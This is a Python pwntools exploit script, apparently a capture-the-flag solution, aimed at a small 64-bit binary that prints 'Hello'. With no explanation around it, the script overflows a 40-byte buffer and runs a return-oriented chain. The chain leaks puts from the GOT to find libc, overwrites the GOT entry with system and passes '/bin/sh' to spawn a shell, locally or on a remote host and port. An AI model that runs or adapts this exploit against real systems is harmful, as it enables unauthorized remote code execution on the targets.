import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###
puts_plt = 0x00000000004004a0
puts_got = 0x601018
gots_plt = 0x00000000004004b0
puts_off = 0x0000000000080a30
system_off = 0x000000000004f4e0

bss_writable = 0x0000000000601040

pop_rdi = 0x0000000000400683
ret_addr = 0x000000000040048e
pop_rsi_r15 = 0x0000000000400681
pop_rdx_off = 0x0000000000001b96

###main###
def main():
    ###payload###
    payload = b"A" * 40
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)

    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(gots_plt)

    payload += p64(ret_addr)
    payload += p64(pop_rdi)
    payload += p64(puts_got + 0x8)
    payload += p64(puts_plt)


    _ = target.recvuntil(b"Hello\n")
    target.sendline(payload)

    puts_addr = u64(target.recvline()[:6] + b"\x00\x00")
    print("[+] puts addr = 0x{:x}".format(puts_addr))
    libc_addr = puts_addr - puts_off
    print("[+] libc addr = 0x{:x}".format(libc_addr))
    system_addr = libc_addr + system_off

    target.sendline(p64(system_addr) + b"/bin/sh\x00")

    #ret = target.recv(2048)

    target.interactive()


if __name__ == "__main__":
    main()